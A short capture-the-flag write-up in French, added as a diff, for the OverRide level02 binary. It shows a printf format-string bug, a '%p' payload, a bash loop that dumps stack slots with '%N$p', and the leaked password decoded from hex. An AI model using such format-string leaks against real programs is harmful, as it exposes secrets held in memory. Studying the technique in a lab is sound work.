@@ -1,0 +1,28 @@
+gdb level02
+
+On remarque une format string à main+654, printf appelle une variable directement.
+on va donc essayer de print la stack avec cette format string;
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p
+--[ Password: %p
+*****************************************
+0x7fffffffe4f0 does not have access!
+
+On va donc un peu plus loin en utilisant un script pour afficher plusieurs adresse de la stack:
+for(( i = 1; i < 42; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
+.....
+22 - 0x756e505234376848 does not have access!
+23 - 0x45414a3561733951 does not have access!
+24 - 0x377a7143574e6758 does not have access!
+25 - 0x354a35686e475873 does not have access!
+26 - 0x48336750664b394d does not have access!
+.....
+
+On remarque quelque chose d'interessant à partir de la ligne 22, il semblerait que le mot de passe soit écrit en dure
+On peut donc concatener chaque ligne puis convertir le tout en ascii.
+
+4868373452506e7551397361354a414558674e5743717a377358476e68354a354d394b6650673348 -> hex to ascii -> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
